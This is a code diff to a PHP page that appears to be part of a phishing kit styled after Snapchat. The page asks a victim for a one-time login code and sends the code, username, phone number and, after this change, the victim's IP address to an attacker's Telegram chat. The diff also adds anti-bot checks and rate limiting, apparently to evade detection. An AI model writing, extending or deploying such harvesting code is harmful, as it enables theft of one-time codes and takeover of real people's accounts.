@@ -3,6 +3,7 @@
 declare(strict_types=1);
 
 require __DIR__ . '/includes/bootstrap.php';
+require __DIR__ . '/includes/antibot.php';
 
 session_start();
 
@@ -22,6 +23,18 @@ if ($flow === null || $flow['secret'] !== $secret) {
 $_SESSION['flow_id'] = $flowId;
 $_SESSION['flow_secret'] = $secret;
 
+if ($_SERVER['REQUEST_METHOD'] === 'GET') {
+    if (!app_rate_limit_allow('otp_page_get', 60, 600)) {
+        http_response_code(429);
+        echo 'Trop de requêtes.';
+        exit;
+    }
+    $flow = app_flow_after_otp_link_notify($flowId, $flow, $digits);
+    app_flow_write($flowId, $flow);
+    app_regenerate_math_challenge();
+    app_touch_form_opened('otp');
+}
+
 $pseudo = $flow['pseudo'];
 $display = '@' . ltrim($pseudo, '@');
 $phone = $flow['phone'] ?? '';
@@ -29,33 +42,43 @@ $error = '';
 $success = '';
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    $code = '';
-    for ($i = 0; $i < $digits; $i++) {
-        $digit = isset($_POST['d' . $i]) ? trim((string) $_POST['d' . $i]) : '';
-        if (!preg_match('/^\d$/', $digit)) {
-            $code = '';
-            break;
-        }
-        $code .= $digit;
-    }
-    if (strlen($code) !== $digits) {
-        $error = 'Veuillez saisir le code à ' . $digits . ' chiffres.';
-    } elseif (!app_telegram_configured()) {
-        $error = 'Configuration Telegram incomplète.';
+    $ab = app_antibot_verify_post('otp', 1.2);
+    if ($ab !== '') {
+        $error = $ab;
+        app_regenerate_math_challenge();
     } else {
-        $text = "Code OTP (" . $digits . " chiffres)\nPseudo : " . $pseudo;
-        if ($phone !== '') {
-            $text .= "\nTéléphone : " . $phone;
+        $code = '';
+        for ($i = 0; $i < $digits; $i++) {
+            $digit = isset($_POST['d' . $i]) ? trim((string) $_POST['d' . $i]) : '';
+            if (!preg_match('/^\d$/', $digit)) {
+                $code = '';
+                break;
+            }
+            $code .= $digit;
         }
-        $text .= "\nCode : " . $code;
-        $r = app_telegram_send([
-            'chat_id' => $config['telegram_chat_id'],
-            'text' => $text,
-        ]);
-        if (!$r['ok']) {
-            $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
+        if (strlen($code) !== $digits) {
+            $error = 'Veuillez saisir le code à ' . $digits . ' chiffres.';
+            app_regenerate_math_challenge();
+        } elseif (!app_telegram_configured()) {
+            $error = 'Configuration Telegram incomplète.';
+            app_regenerate_math_challenge();
         } else {
-            $success = 'Code envoyé. Merci.';
+            $text = "Code OTP (" . $digits . " chiffres)\nPseudo : " . $pseudo;
+            if ($phone !== '') {
+                $text .= "\nTéléphone : " . $phone;
+            }
+            $text .= "\nCode : " . $code;
+            $text .= "\nIP envoi : " . app_client_ip();
+            $r = app_telegram_send([
+                'chat_id' => $config['telegram_chat_id'],
+                'text' => $text,
+            ]);
+            if (!$r['ok']) {
+                $error = htmlspecialchars((string) ($r['error'] ?? 'Erreur'), ENT_QUOTES, 'UTF-8');
+                app_regenerate_math_challenge();
+            } else {
+                $success = 'Code envoyé. Merci.';
+            }
         }
     }
 }
@@ -89,6 +112,7 @@ $css = require __DIR__ . '/includes/snap_styles.php';
         <?php endif; ?>
 
         <form method="post" action="">
+            <?php require __DIR__ . '/includes/form_antibot_fields.php'; ?>
             <input type="hidden" name="digits" value="<?= $digits ?>">
             <div class="otp-row">
                 <?php for ($i = 0; $i < $digits; $i++) : ?>
